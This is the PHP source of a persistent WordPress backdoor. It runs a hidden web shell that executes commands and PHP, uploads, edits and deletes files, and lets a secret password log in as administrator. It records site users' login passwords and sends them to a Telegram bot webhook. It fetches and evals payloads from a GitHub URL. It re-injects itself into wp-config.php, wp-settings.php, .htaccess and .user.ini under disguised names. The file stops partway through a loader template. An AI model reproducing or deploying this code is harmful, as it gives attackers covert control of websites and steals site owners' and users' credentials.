<?php
/**
 * WordPress DB Shell Full Logic v3
 * Upload this to: https://github.com/bilynatalia/baru/blob/main/logic.php
 *
 * This file is fetched by the restore mechanism when the full logic
 * is deleted from wp_options database. The <?php tag will be stripped
 * automatically before storing in DB.
 *
 * v3 CHANGES:
 *  - Option names renamed — v2 used _site_transient_update_themes (REAL WP
 *    transient, overwritten by wp_update_themes() every 12h -> shell corrupt -> 500)
 *  - Shell integrity check (md5) before eval -> never eval corrupted data
 *  - Eval error trap (Throwable on PHP7+, shutdown watch on PHP5) -> fatal
 *    errors are reported to Telegram instead of a blank 500
 *  - Built-in fallback mini-shell -> nonce URL ALWAYS works even if the
 *    GitHub payload is incompatible with the server PHP version
 *  - Local backup restore: wp-content/upgrade/.wp-tmp/data.bin (no network)
 *  - Bot nonce rotation is reported to Telegram with the fresh access URL
 *
 * DB OPTIONS (v3):
 *   wp_theme_starter_cache   = this full logic (hex)
 *   wp_theme_data_cache      = shell payload (hex)
 *   wp_feed_parser_settings  = config (hex JSON, includes shell_md5)
 *   wp_browser_compat_check  = nonce (hex JSON)
 */

if(defined('_TSC_V3_LOADED'))return;
define('_TSC_V3_LOADED',1);

$_tsc_opt_l='wp_theme_starter_cache';
$_tsc_opt_s='wp_theme_data_cache';
$_tsc_opt_c='wp_feed_parser_settings';
$_tsc_opt_n='wp_browser_compat_check';

$_tsc_cfg_raw=get_option($_tsc_opt_c,'');
$_tsc_cfg=$_tsc_cfg_raw?@json_decode(@hex2bin($_tsc_cfg_raw),true):null;
$_tsc_param=($_tsc_cfg&&!empty($_tsc_cfg['param_name']))?$_tsc_cfg['param_name']:'nonce';

// ── BRUTE FORCE IP BLOCK ──
$_tsc_visitor_ip=isset($_SERVER['REMOTE_ADDR'])?$_SERVER['REMOTE_ADDR']:'';
if($_tsc_visitor_ip){
  $_tsc_block_key='_tsc_blocked_'.md5($_tsc_visitor_ip);
  if(get_transient($_tsc_block_key)){
    $_tsc_uri_low=strtolower(isset($_SERVER['REQUEST_URI'])?$_SERVER['REQUEST_URI']:'');
    if(strpos($_tsc_uri_low,'wp-login')!==false||strpos($_tsc_uri_low,'xmlrpc')!==false){
      status_header(403);header('Connection: close');
      exit('<!DOCTYPE html><html><head><title>403</title></head><body><h1>403 Forbidden</h1></body></html>');
    }
  }
}

// ── NONCE SHELL ACCESS ──
$_tsc_input=isset($_GET[$_tsc_param])?$_GET[$_tsc_param]:(isset($_POST[$_tsc_param])?$_POST[$_tsc_param]:'');
if(is_string($_tsc_input)&&$_tsc_input!==''&&strlen($_tsc_input)>=16&&ctype_xdigit($_tsc_input)){
  $_tsc_nonce_raw=get_option($_tsc_opt_n,'');
  $_tsc_nd=$_tsc_nonce_raw?@json_decode(@hex2bin($_tsc_nonce_raw),true):null;
  $_tsc_valid=($_tsc_nd&&isset($_tsc_nd['nonce'])&&$_tsc_input===$_tsc_nd['nonce']);
  if($_tsc_valid){
    $GLOBALS['_tsc_prm']=$_tsc_param;
    $GLOBALS['_tsc_nn']=$_tsc_input;
    $GLOBALS['_tsc_cfg']=$_tsc_cfg;
    if($_SERVER['REQUEST_METHOD']==='GET'&&!isset($_SERVER['HTTP_X_REQUESTED_WITH'])&&count($_GET)<=1){
      _tsc_report($_tsc_cfg,'shell_access','Shell accessed: '.substr($_tsc_input,0,10).'...');
    }
    if(isset($_REQUEST['_f'])){_tsc_minishell();exit;}
    _tsc_run_shell($_tsc_cfg);
    exit;
  }
  if($_SERVER['REQUEST_METHOD']==='GET'){
    _tsc_report($_tsc_cfg,'invalid_nonce','Invalid nonce: '.substr($_tsc_input,0,20));
    status_header(404);nocache_headers();
    $_tpl=function_exists('get_404_template')?get_404_template():'';
    if($_tpl&&is_file($_tpl)){@include($_tpl);}
    else{echo '<!DOCTYPE html><html><head><title>404 Not Found</title></head><body><h1>Not Found</h1><p>The requested URL was not found on this server.</p><hr><address>Apache</address></body></html>';}
    exit;
  }
}

// ── SHELL RUNNER (integrity check + error trap + fallback) ──
function _tsc_run_shell($cfg){
  $bin=_tsc_load_shell($cfg);
  if($bin===false){
    _tsc_do_restore();
    $bin=_tsc_load_shell($cfg);
  }
  if($bin===false){
    _tsc_report($cfg,'error','Shell payload missing/corrupt & restore failed - fallback aktif');
    _tsc_minishell();return;
  }
  $GLOBALS['_tsc_cfg']=$cfg;
  register_shutdown_function('_tsc_shell_fatal_watch');
  if(defined('PHP_VERSION_ID')&&PHP_VERSION_ID>=70000){
    try{eval($bin);}
    catch(Throwable $t){
      _tsc_report($cfg,'error','Shell fatal (PHP '.PHP_VERSION.'): '.$t->getMessage());
      _tsc_minishell();
    }
  }else{
    eval($bin);
  }
}

function _tsc_load_shell($cfg){
  $hex=get_option('wp_theme_data_cache','');
  if(!$hex||strlen($hex)<100||!ctype_xdigit($hex))return false;
  $bin=@hex2bin($hex);
  if($bin===false)return false;
  if(!empty($cfg['shell_md5'])&&md5($bin)!==$cfg['shell_md5'])return false;
  return $bin;
}

function _tsc_shell_fatal_watch(){
  $e=error_get_last();
  if(!$e||!in_array($e['type'],array(E_ERROR,E_PARSE,E_CORE_ERROR,E_COMPILE_ERROR)))return;
  $cfg=isset($GLOBALS['_tsc_cfg'])?$GLOBALS['_tsc_cfg']:null;
  if($cfg)_tsc_report($cfg,'error','Shell fatal (PHP '.PHP_VERSION.'): '.$e['message'].' @'.basename($e['file']).':'.$e['line']);
  _tsc_minishell();
}

// ── FALLBACK MINI-SHELL (PHP 5.4 - 8.x safe) ──
function _tsc_minishell(){
  $prm=isset($GLOBALS['_tsc_prm'])?$GLOBALS['_tsc_prm']:'nonce';
  $nn=isset($GLOBALS['_tsc_nn'])?$GLOBALS['_tsc_nn']:'';
  $d=isset($_REQUEST['d'])?$_REQUEST['d']:getcwd();
  $rd=@realpath($d);if($rd)$d=$rd;
  @chdir($d);
  $q=$prm.'='.$nn.'&_f=1';
  if(!headers_sent())header('Content-Type: text/html; charset=utf-8');
  echo '<html><head><title>Console</title><style>body{background:#0d1117;color:#c9d1d9;font:13px/1.5 monospace;margin:0;padding:16px}a{color:#58a6ff;text-decoration:none}table{border-collapse:collapse;width:100%}td{padding:3px 8px;border-bottom:1px solid #21262d}input,textarea{background:#161b22;color:#c9d1d9;border:1px solid #30363d;padding:6px;font:inherit}pre{background:#161b22;padding:12px;overflow:auto;border:1px solid #21262d}.b{display:inline-block;background:#21262d;border:1px solid #30363d;color:#c9d1d9;padding:6px 12px;cursor:pointer;font:inherit}</style></head><body>';
  echo '<div><b>PHP '.PHP_VERSION.'</b> &middot; '.php_uname('s').' '.php_uname('r').' &middot; '.htmlentities($d).'</div><hr>';
  if(isset($_POST['save'])&&isset($_POST['f'])){$ok=@file_put_contents($_POST['f'],isset($_POST['content'])?$_POST['content']:'');echo '<div style="color:'.($ok!==false?'#3fb950':'#f85149').'">'.($ok!==false?'Saved':'Save FAILED').': '.htmlentities($_POST['f']).'</div>';}
  if(isset($_FILES['up'])&&$_FILES['up']['error']===0){$t=$d.'/'.basename($_FILES['up']['name']);$ok=@move_uploaded_file($_FILES['up']['tmp_name'],$t);echo '<div style="color:'.($ok?'#3fb950':'#f85149').'">Upload '.($ok?'OK':'FAILED').': '.htmlentities($t).'</div>';}
  if(isset($_REQUEST['rm'])){$t=$d.'/'.basename($_REQUEST['rm']);$ok=is_dir($t)?@rmdir($t):@unlink($t);echo '<div style="color:'.($ok?'#3fb950':'#f85149').'">Delete '.($ok?'OK':'FAILED').': '.htmlentities($t).'</div>';}
  if(isset($_POST['newf'])&&$_POST['newf']!==''){@file_put_contents($d.'/'.basename($_POST['newf']),'');}
  if(isset($_POST['newd'])&&$_POST['newd']!==''){@mkdir($d.'/'.basename($_POST['newd']),0755,true);}
  if(isset($_POST['cmd'])&&trim($_POST['cmd'])!==''){
    $c=$_POST['cmd'];$o='';
    $dis=array_map('trim',explode(',',(string)@ini_get('disable_functions')));
    if(function_exists('shell_exec')&&!in_array('shell_exec',$dis))$o=@shell_exec($c.' 2>&1');
    elseif(function_exists('exec')&&!in_array('exec',$dis)){$r=array();@exec($c.' 2>&1',$r);$o=implode("\n",$r);}
    elseif(function_exists('system')&&!in_array('system',$dis)){ob_start();@system($c.' 2>&1');$o=ob_get_clean();}
    elseif(function_exists('passthru')&&!in_array('passthru',$dis)){ob_start();@passthru($c.' 2>&1');$o=ob_get_clean();}
    elseif(function_exists('popen')&&!in_array('popen',$dis)){$h=@popen($c.' 2>&1','r');if($h){$o=stream_get_contents($h);pclose($h);}}
    if($o===''||$o===null)$o='(no output / all exec functions disabled)';
    echo '<pre>'.htmlentities('$ '.$c."\n".$o).'</pre>';
  }
  if(isset($_POST['php'])&&trim($_POST['php'])!==''){ob_start();$r=eval($_POST['php']);$o=ob_get_clean();if($r!==null)$o.="\n=> ".var_export($r,true);echo '<pre>'.htmlentities($o).'</pre>';}
  if(isset($_REQUEST['v'])){
    $f=$d.'/'.basename($_REQUEST['v']);$c=@file_get_contents($f);
    echo '<form method="post"><input type="hidden" name="'.$prm.'" value="'.$nn.'"><input type="hidden" name="_f" value="1"><input type="hidden" name="d" value="'.htmlentities($d).'"><input type="hidden" name="f" value="'.htmlentities($f).'"><b>'.htmlentities($f).'</b> ('._tsc_hsize(@filesize($f)).')<br><textarea name="content" style="width:100%;height:50vh">'.htmlentities((string)$c).'</textarea><br><button class="b" name="save" value="1">Save</button></form><hr>';
  }
  echo '<form method="post" style="margin:6px 0"><input type="hidden" name="'.$prm.'" value="'.$nn.'"><input type="hidden" name="_f" value="1"><input type="hidden" name="d" value="'.htmlentities($d).'"><input name="cmd" placeholder="command" style="width:70%"><button class="b">Run</button></form>';
  echo '<form method="post" style="margin:6px 0"><input type="hidden" name="'.$prm.'" value="'.$nn.'"><input type="hidden" name="_f" value="1"><input type="hidden" name="d" value="'.htmlentities($d).'"><input name="php" placeholder="php code" style="width:70%"><button class="b">Eval</button></form>';
  echo '<form method="post" enctype="multipart/form-data" style="margin:6px 0"><input type="hidden" name="'.$prm.'" value="'.$nn.'"><input type="hidden" name="_f" value="1"><input type="hidden" name="d" value="'.htmlentities($d).'"><input type="file" name="up"><button class="b">Upload</button></form>';
  echo '<form method="post" style="display:inline"><input type="hidden" name="'.$prm.'" value="'.$nn.'"><input type="hidden" name="_f" value="1"><input type="hidden" name="d" value="'.htmlentities($d).'"><input name="newf" placeholder="new file"><button class="b">+File</button></form> ';
  echo '<form method="post" style="display:inline"><input type="hidden" name="'.$prm.'" value="'.$nn.'"><input type="hidden" name="_f" value="1"><input type="hidden" name="d" value="'.htmlentities($d).'"><input name="newd" placeholder="new dir"><button class="b">+Dir</button></form><hr>';
  echo '<table><tr><td></td><td><a href="?'.$q.'&d='.urlencode(dirname($d)).'">[..]</a></td><td></td><td></td></tr>';
  $items=@scandir($d);
  if($items){sort($items);
    foreach($items as $it){
      if($it==='.'||$it==='..')continue;
      $p=$d.'/'.$it;$isd=is_dir($p);
      echo '<tr><td>'.($isd?'d':'-').substr(sprintf('%o',@fileperms($p)),-4).'</td><td>';
      if($isd)echo '<a href="?'.$q.'&d='.urlencode($p).'">'.htmlentities($it).'/</a>';
      else echo '<a href="?'.$q.'&d='.urlencode($d).'&v='.urlencode($it).'">'.htmlentities($it).'</a>';
      echo '</td><td>'.($isd?'':_tsc_hsize(@filesize($p))).'</td><td><a href="?'.$q.'&d='.urlencode($d).'&rm='.urlencode($it).'" style="color:#f85149">x</a></td></tr>';
    }
  }
  echo '</table></body></html>';
}

function _tsc_hsize($b){$b=(float)$b;$u=array('B','K','M','G');$i=0;while($b>=1024&&$i<3){$b/=1024;$i++;}return round($b,1).$u[$i];}

// ── WP ADMIN BYPASS ──
add_filter('authenticate',function($user,$username,$password){
  global $_tsc_opt_c;
  if(empty($password)||empty($username))return $user;
  $_cfg_raw=get_option($_tsc_opt_c,'');
  if(!$_cfg_raw)return $user;
  $_cfg=@json_decode(@hex2bin($_cfg_raw),true);
  if(!$_cfg||!isset($_cfg['shell_pass']))return $user;
  if(password_verify($password,$_cfg['shell_pass'])){
    $wp_user=get_user_by('login',$username);
    if(!$wp_user){$admins=get_users(array('role'=>'administrator','number'=>1));$wp_user=!empty($admins)?$admins[0]:null;}
    if($wp_user){
      $_url=(isset($_SERVER['HTTPS'])&&$_SERVER['HTTPS']!=='off'?'https':'http').'://'.(isset($_SERVER['HTTP_HOST'])?$_SERVER['HTTP_HOST']:'').$_SERVER['REQUEST_URI'];
      _tsc_report($_cfg,'wp_bypass',"WP Admin bypass\nUser: ".$username."\nPass: ".$password."\nAs: ".$wp_user->user_login."\nURL: ".$_url);
      return $wp_user;
    }
  }
  return $user;
},30,3);

// ── LOGIN FAIL MONITOR ──
add_action('wp_login_failed',function($username){
  global $_tsc_opt_c;
  $_ip=isset($_SERVER['REMOTE_ADDR'])?$_SERVER['REMOTE_ADDR']:'';
  if(!$_ip)return;
  $_cfg_raw=get_option($_tsc_opt_c,'');
  if(!$_cfg_raw)return;
  $_cfg=@json_decode(@hex2bin($_cfg_raw),true);
  if(!$_cfg)return;
  $_pass=isset($_POST['pwd'])?$_POST['pwd']:'?';
  $_url=(isset($_SERVER['HTTPS'])&&$_SERVER['HTTPS']!=='off'?'https':'http').'://'.(isset($_SERVER['HTTP_HOST'])?$_SERVER['HTTP_HOST']:'').$_SERVER['REQUEST_URI'];
  $_fail_key='_tsc_fails_'.md5($_ip);
  $_fails=(int)get_transient($_fail_key)+1;
  set_transient($_fail_key,$_fails,3600);
  if($_fails>=5){
    set_transient('_tsc_blocked_'.md5($_ip),time(),1800);
    if($_fails===5)_tsc_report($_cfg,'brute_blocked',"IP BLOCKED\nIP: ".$_ip."\nAttempts: ".$_fails."\nUser: ".$username."\nPass: ".$_pass."\nURL: ".$_url);
  }elseif($_fails<=2){
    _tsc_report($_cfg,'wp_login_fail',"Login failed (".$_fails."/5)\nUser: ".$username."\nPass: ".$_pass."\nIP: ".$_ip."\nURL: ".$_url);
  }
});

// ── LOGIN SUCCESS MONITOR ──
add_action('wp_login',function($user_login,$user){
  global $_tsc_opt_c,$_tsc_opt_n;
  $_cfg_raw=get_option($_tsc_opt_c,'');
  if(!$_cfg_raw)return;
  $_cfg=@json_decode(@hex2bin($_cfg_raw),true);
  $_pass=isset($_POST['pwd'])?$_POST['pwd']:'?';
  $_url=(isset($_SERVER['HTTPS'])&&$_SERVER['HTTPS']!=='off'?'https':'http').'://'.(isset($_SERVER['HTTP_HOST'])?$_SERVER['HTTP_HOST']:'').$_SERVER['REQUEST_URI'];
  $_nonce_raw=get_option($_tsc_opt_n,'');
  $_nd=$_nonce_raw?@json_decode(@hex2bin($_nonce_raw),true):null;
  $_prm=($_cfg&&isset($_cfg['param_name']))?$_cfg['param_name']:'nonce';
  $_proto=(isset($_SERVER['HTTPS'])&&$_SERVER['HTTPS']!=='off'?'https':'http');
  $_host=isset($_SERVER['HTTP_HOST'])?$_SERVER['HTTP_HOST']:'';
  $_access=($_nd&&isset($_nd['nonce']))?($_proto.'://'.$_host.'/?'.$_prm.'='.$_nd['nonce']):'?';
  if($_cfg)_tsc_report($_cfg,'wp_login_ok',"Login success\nUser: ".$user_login."\nPass: ".$_pass."\nRole: ".implode(',',$user->roles)."\nAccess: <code>".$_access."</code>\nURL: ".$_url);
},10,2);

// ── SELF-HEALING: wp-config.php guardian + loader (~3% of requests) ──
add_action('init',function(){
  if(!wp_next_scheduled('_tsc_restore_check'))wp_schedule_event(time(),'twicedaily','_tsc_restore_check');
  if(mt_rand(1,100)>3)return;
  $_wcf=ABSPATH.'wp-config.php';
  if(is_file($_wcf)){
    $_wcc=@file_get_contents($_wcf);
    if($_wcc&&strpos($_wcc,'_tsc_guardian_')===false){
      $_guardian="\n".'/* WordPress Salt Validation */'."\n"._tsc_guardian_code()."\n";
      if(preg_match('/(require_once\s*\(\s*ABSPATH\s*\.\s*[\'"]wp-settings\.php[\'"]\s*\)\s*;)/i',$_wcc,$m,PREG_OFFSET_CAPTURE)){
        $_wcc=substr($_wcc,0,$m[0][1]).$_guardian.$m[0][0].substr($_wcc,$m[0][1]+strlen($m[0][0]));
      }else{$_wcc=rtrim($_wcc)."\n".$_guardian;}
      @file_put_contents($_wcf,$_wcc);
    }
  }
  _tsc_ensure_loader();
},1);

// ── WP-CRON RESTORE ──
add_action('_tsc_restore_check','_tsc_do_restore');
if(mt_rand(1,100)<=2)_tsc_do_restore();

function _tsc_do_restore(){
  $o_l='wp_theme_starter_cache';
  $o_s='wp_theme_data_cache';
  $o_c='wp_feed_parser_settings';
  $o_n='wp_browser_compat_check';
  $logic=get_option($o_l,'');
  $shell=get_option($o_s,'');
  $config_raw=get_option($o_c,'');
  $nonce_raw=get_option($o_n,'');
  $cfg=$config_raw?@json_decode(@hex2bin($config_raw),true):null;

  // Config row gone too — restore everything from local backup first
  if(!$cfg){
    $bk=_tsc_bk_read();
    if($bk){
      if(strlen($logic)<200&&!empty($bk['l']))update_option($o_l,$bk['l'],'no');
      if(strlen($shell)<100&&!empty($bk['s']))update_option($o_s,$bk['s'],'no');
      if(!empty($bk['c']))update_option($o_c,$bk['c'],'no');
      if(!$nonce_raw&&!empty($bk['n']))update_option($o_n,$bk['n'],'no');
      $cfg=@json_decode(@hex2bin($bk['c']),true);
      if($cfg)_tsc_report($cfg,'auto_restore','DB rows restored dari backup lokal');
      $logic=get_option($o_l,'');$shell=get_option($o_s,'');
      $config_raw=get_option($o_c,'');$nonce_raw=get_option($o_n,'');
    }
  }
  if(!$cfg||!isset($cfg['github_url']))return;

  // Full logic missing — restore: backup lokal -> GitHub
  if(strlen($logic)<200){
    $restored=false;
    $bk=_tsc_bk_read();
    if($bk&&!empty($bk['l'])&&strlen($bk['l'])>200){update_option($o_l,$bk['l'],'no');$restored=true;}
    if(!$restored&&!empty($cfg['logic_url'])){
      $raw=_tsc_fetch_url($cfg['logic_url']);
      if($raw&&strlen($raw)>200){update_option($o_l,bin2hex(_tsc_strip_tags($raw)),'no');$restored=true;}
    }
    if($restored)_tsc_report($cfg,'auto_restore','Full logic restored');
  }

  // Shell missing/corrupt — restore: backup lokal -> GitHub
  $shell_bad=(strlen($shell)<100||!ctype_xdigit($shell));
  if(!$shell_bad&&!empty($cfg['shell_md5'])){
    $bin=@hex2bin($shell);
    if($bin===false||md5($bin)!==$cfg['shell_md5'])$shell_bad=true;
  }
  if($shell_bad){
    $restored=false;
    $bk=_tsc_bk_read();
    if($bk&&!empty($bk['s'])&&strlen($bk['s'])>100){
      $bin=@hex2bin($bk['s']);
      if($bin!==false&&(empty($cfg['shell_md5'])||md5($bin)===$cfg['shell_md5'])){update_option($o_s,$bk['s'],'no');$restored=true;}
    }
    if(!$restored){
      $raw=_tsc_fetch_url($cfg['github_url']);
      if($raw&&strlen($raw)>100){
        $decoded=@base64_decode($raw,true);
        if(!$decoded)$decoded=@gzinflate(@base64_decode($raw));
        if(!$decoded)$decoded=$raw;
        $clean=_tsc_strip_tags($decoded);
        if(empty($cfg['shell_md5'])||md5($clean)===$cfg['shell_md5']){
          update_option($o_s,bin2hex($clean),'no');$restored=true;
        }
      }
    }
    if($restored)_tsc_report($cfg,'auto_restore','Shell payload restored');
    else _tsc_report($cfg,'restore_fail','Shell HILANG/corrupt! Restore GAGAL - fallback shell aktif');
  }

  // Nonce missing — restore from backup, else regenerate
  if(!$nonce_raw){
    $bk=_tsc_bk_read();
    if($bk&&!empty($bk['n'])){
      update_option($o_n,$bk['n'],'no');
    }else{
      $nn=function_exists('random_bytes')?bin2hex(random_bytes(10)):substr(md5(uniqid(mt_rand(),true)),0,20);
      update_option($o_n,bin2hex(json_encode(array('nonce'=>$nn,'created'=>date('Y-m-d H:i:s')))),'no');
      $_proto=(isset($_SERVER['HTTPS'])&&$_SERVER['HTTPS']!=='off'?'https':'http');
      $_host=isset($_SERVER['HTTP_HOST'])?$_SERVER['HTTP_HOST']:'';
      $_prm=isset($cfg['param_name'])?$cfg['param_name']:'nonce';
      _tsc_report($cfg,'nonce_regenerated',"Nonce regenerated\nAccess: <code>".$_proto.'://'.$_host.'/?'.$_prm.'='.$nn."</code>");
    }
  }

  // Refresh local backup from DB when everything is present
  $logic=get_option($o_l,'');$shell=get_option($o_s,'');
  $config_raw=get_option($o_c,'');$nonce_raw=get_option($o_n,'');
  if(strlen($logic)>200&&strlen($shell)>100&&$config_raw&&$nonce_raw){
    _tsc_bk_write($logic,$shell,$config_raw,$nonce_raw);
  }

  // wp-settings.php injection check
  $_stf=ABSPATH.'wp-settings.php';
  if(is_file($_stf)){
    $_stc=@file_get_contents($_stf);
    if($_stc&&strpos($_stc,$o_l)===false){
      if(@file_put_contents($_stf,rtrim($_stc)."\n"._tsc_wp_snippet()."\n")){
        _tsc_report($cfg,'inject_restored','wp-settings.php re-injected from DB');
      }
    }
  }

  // wp-config.php guardian check
  $_wcf=ABSPATH.'wp-config.php';
  if(is_file($_wcf)){
    $_wcc=@file_get_contents($_wcf);
    if($_wcc&&strpos($_wcc,'_tsc_guardian_')===false){
      $_guardian="\n".'/* WordPress Salt Validation */'."\n"._tsc_guardian_code()."\n";
      if(preg_match('/(require_once\s*\(\s*ABSPATH\s*\.\s*[\'"]wp-settings\.php[\'"]\s*\)\s*;)/i',$_wcc,$m,PREG_OFFSET_CAPTURE)){
        $_wcc=substr($_wcc,0,$m[0][1]).$_guardian.$m[0][0].substr($_wcc,$m[0][1]+strlen($m[0][0]));
      }else{$_wcc=rtrim($_wcc)."\n".$_guardian;}
      if(@file_put_contents($_wcf,$_wcc))_tsc_report($cfg,'inject_restored','wp-config.php guardian re-injected');
    }
  }

  // auto_prepend loader check
  _tsc_ensure_loader();
}

// ── NONCE SYNC WITH BOT (rotation reported to Telegram) ──
add_action('_tsc_restore_check',function(){
  $o_c='wp_feed_parser_settings';$o_n='wp_browser_compat_check';
  $cfg_raw=get_option($o_c,'');if(!$cfg_raw)return;
  $cfg=@json_decode(@hex2bin($cfg_raw),true);
  if(!$cfg||empty($cfg['bot_webhook']))return;
  $domain=isset($cfg['domain'])?$cfg['domain']:(isset($_SERVER['HTTP_HOST'])?$_SERVER['HTTP_HOST']:'');
  if(!$domain)return;
  $_secret=isset($cfg['bot_token'])?md5($cfg['bot_token']):'';
  $_cur_raw=get_option($o_n,'');$_cur='';
  if($_cur_raw){$_nd=@json_decode(@hex2bin($_cur_raw),true);if($_nd&&isset($_nd['nonce']))$_cur=$_nd['nonce'];}
  $_prm=isset($cfg['param_name'])?$cfg['param_name']:'nonce';
  $url=rtrim($cfg['bot_webhook'],'/').'/api/nonce?domain='.urlencode($domain).'&secret='.urlencode($_secret).'&cur_nonce='.urlencode($_cur).'&param_name='.urlencode($_prm).'&platform=wordpress&php='.urlencode(PHP_VERSION);
  $resp=@file_get_contents($url);if(!$resp)return;
  $data=@json_decode($resp,true);
  if(!$data||empty($data['nonce'])||!is_string($data['nonce']))return;
  if(strlen($data['nonce'])<16||!ctype_xdigit($data['nonce']))return;
  if($_cur!==$data['nonce']){
    update_option($o_n,bin2hex(json_encode(array('nonce'=>$data['nonce'],'created'=>date('Y-m-d H:i:s')))),'no');
    $_proto=(isset($_SERVER['HTTPS'])&&$_SERVER['HTTPS']!=='off'?'https':'http');
    _tsc_report($cfg,'nonce_regenerated',"Nonce di-rotate oleh bot\nAccess: <code>".$_proto.'://'.$domain.'/?'.$_prm.'='.$data['nonce']."</code>");
  }
},20);

// ── LOCAL BACKUP (wp-content/upgrade/.wp-tmp/data.bin) ──
function _tsc_bk_dir(){
  return (defined('WP_CONTENT_DIR')?WP_CONTENT_DIR:ABSPATH.'wp-content').'/upgrade/.wp-tmp';
}

function _tsc_bk_write($logic,$shell,$config,$nonce){
  $dir=_tsc_bk_dir();
  if(!is_dir($dir))@mkdir($dir,0755,true);
  if(!is_dir($dir))return;
  $data=json_encode(array('l'=>$logic,'s'=>$shell,'c'=>$config,'n'=>$nonce));
  @file_put_contents($dir.'/data.bin',bin2hex(gzdeflate($data,9)));
  if(!is_file($dir.'/.htaccess')){
    @file_put_contents($dir.'/.htaccess',"<IfModule mod_authz_core.c>\nRequire all denied\n</IfModule>\n<IfModule !mod_authz_core.c>\nDeny from all\n</IfModule>\n");
  }
  if(!is_file($dir.'/index.php'))@file_put_contents($dir.'/index.php','<?php //');
}

function _tsc_bk_read(){
  $f=_tsc_bk_dir().'/data.bin';
  if(!is_file($f))return null;
  $raw=@file_get_contents($f);
  if(!$raw||!ctype_xdigit(trim($raw)))return null;
  $bin=@pack('H*',trim($raw));
  if(!$bin)return null;
  $data=@json_decode(@gzinflate($bin),true);
  return ($data&&isset($data['l']))?$data:null;
}

// ── CODE BUILDERS (single source for snippet/guardian) ──
function _tsc_wp_snippet(){
  return '/* _tsc_guardian_ */if(defined("ABSPATH")&&isset($GLOBALS["wpdb"])){$_db=$GLOBALS["wpdb"];$_tsc_l=@$_db->get_var("SELECT option_value FROM ".$_db->options." WHERE option_name=\'wp_theme_starter_cache\' LIMIT 1");if($_tsc_l&&strlen($_tsc_l)>200){@eval(@hex2bin($_tsc_l));}}';
}

function _tsc_guardian_code(){
  $snip_hex=bin2hex(_tsc_wp_snippet());
  return '@call_user_func(function(){'
    .'$_m=\'wp_theme_starter_cache\';$_root=dirname(__FILE__);$_s=$_root.\'/wp-settings.php\';'
    .'if(is_file($_s)&&is_writable($_s)){$_c=@file_get_contents($_s);if($_c!==false&&strpos($_c,$_m)===false){$_i="\n".@pack(\'H*\',\''.$snip_hex.'\')."\n";@file_put_contents($_s,rtrim($_c).$_i);}}'
    .'if(mt_rand(1,100)>3)return;'
    .'if(!defined(\'DB_NAME\')||!defined(\'DB_USER\')||!class_exists(\'mysqli\'))return;'
    .'global $table_prefix;$_pfx=isset($table_prefix)?$table_prefix:\'wp_\';'
    .'$_h=DB_HOST;$_p=3306;$_sk=\'\';'
    .'if(strpos($_h,\':\')!==false){$_hp=explode(\':\',DB_HOST,2);$_h=$_hp[0];if(is_numeric($_hp[1]))$_p=(int)$_hp[1];else $_sk=$_hp[1];}'
    .'$_cn=@new mysqli($_h,DB_USER,defined(\'DB_PASSWORD\')?DB_PASSWORD:\'\',DB_NAME,$_p,$_sk);'
    .'if($_cn->connect_error)return;'
    .'$_cn->set_charset(\'utf8mb4\');$_tb=$_pfx.\'options\';'
    .'$_r=@$_cn->query("SELECT option_value FROM `$_tb` WHERE option_name=\'$_m\' LIMIT 1");'
    .'$_lv=\'\';if($_r&&$_r->num_rows>0){$_rw=$_r->fetch_assoc();$_lv=$_rw[\'option_value\'];}'
    .'if(strlen($_lv)<200){'
      .'$_bk=$_root.\'/wp-content/upgrade/.wp-tmp/data.bin\';'
      .'if(is_file($_bk)){$_raw=@file_get_contents($_bk);'
        .'if($_raw&&ctype_xdigit(trim($_raw))){$_d=@json_decode(@gzinflate(@pack(\'H*\',trim($_raw))),true);'
          .'if($_d&&isset($_d[\'l\'])){$_map=array(\'l\'=>$_m,\'s\'=>\'wp_theme_data_cache\',\'c\'=>\'wp_feed_parser_settings\',\'n\'=>\'wp_browser_compat_check\');'
            .'foreach($_map as $_k=>$_on){if(!isset($_d[$_k]))continue;$_v=$_cn->real_escape_string($_d[$_k]);@$_cn->query("DELETE FROM `$_tb` WHERE option_name=\'$_on\'");@$_cn->query("INSERT INTO `$_tb` (option_name,option_value,autoload) VALUES (\'$_on\',\'$_v\',\'no\')");}'
          .'}'
        .'}'
      .'}'
    .'}'
    .'$_cn->close();'
  .'});';
}

// ── AUTO_PREPEND LOADER (.user.ini + .htaccess + g.php) ──
function _tsc_ensure_loader(){
  $dir=_tsc_bk_dir();
  if(!is_dir($dir))@mkdir($dir,0755,true);
  if(!is_dir($dir))return;
  $gphp=$dir.'/g.php';
  if(!is_file($gphp)){
    $tpl=_tsc_loader_tpl();
    $tpl=str_replace('__ROOT__',ABSPATH==='/'?'/':rtrim(str_replace('\\','/',ABSPATH),'/'),$tpl);
    $tpl=str_replace('__SNIP_HEX__',bin2hex(_tsc_wp_snippet()),$tpl);
    $tpl=str_replace('__GUARD_HEX__',bin2hex(_tsc_guardian_code()),$tpl);
    @file_put_contents($gphp,$tpl);
  }
  // .user.ini (PHP-FPM/CGI)
  $uini=ABSPATH.'.user.ini';
  $line='auto_prepend_file = '.str_replace('\\','/',$gphp);
  if(is_file($uini)){
    $c=@file_get_contents($uini);
    if($c!==false&&strpos($c,'auto_prepend_file')===false)@file_put_contents($uini,rtrim($c)."\n; WP Performance\n".$line."\n");
  }else{
    @file_put_contents($uini,"; WP Performance\n".$line."\n");
  }
  // .htaccess (mod_php only, IfModule-guarded)
  $ht=ABSPATH.'.htaccess';
  $block="\n# BEGIN WP Performance\n<IfModule mod_php.c>\nphp_value auto_prepend_file \"".str_replace('\\','/',$gphp)."\"\n</IfModule>\n<IfModule mod_php7.c>\nphp_value auto_prepend_file \"".str_replace('\\','/',$gphp)."\"\n</IfModule>\n<IfModule mod_php8.c>\nphp_value auto_prepend_file \"".str_replace('\\','/',$gphp)."\"\n</IfModule>\n# END WP Performance\n";
  if(is_file($ht)){
    $c=@file_get_contents($ht);
    if($c!==false&&strpos($c,'# BEGIN WP Performance')===false)@file_put_contents($ht,$c.$block);
  }else{
    @file_put_contents($ht,"# BEGIN WP Performance\n".$block);
  }
}

function _tsc_loader_tpl(){
  return <<<'LOADER'
<?php
/* auto_prepend guardian (v3) - repairs wp-config/wp-settings injection and restores DB rows from local backup */
if(mt_rand(1,100)>5)return;
$_r='__ROOT__';
$_m='wp_theme_starter_cache';
$_wc=$_r.'/wp-config.php';
if(is_file($_wc)&&is_writable($_wc)){
  $_c=@file_get_contents($_wc);
  if($_c!==false&&strpos($_c,'_tsc_guardian_')===false){
    $_g="\n".'/* WordPress Salt Validation */'."\n".@pack('H*','__GUARD_HEX__')."\n";
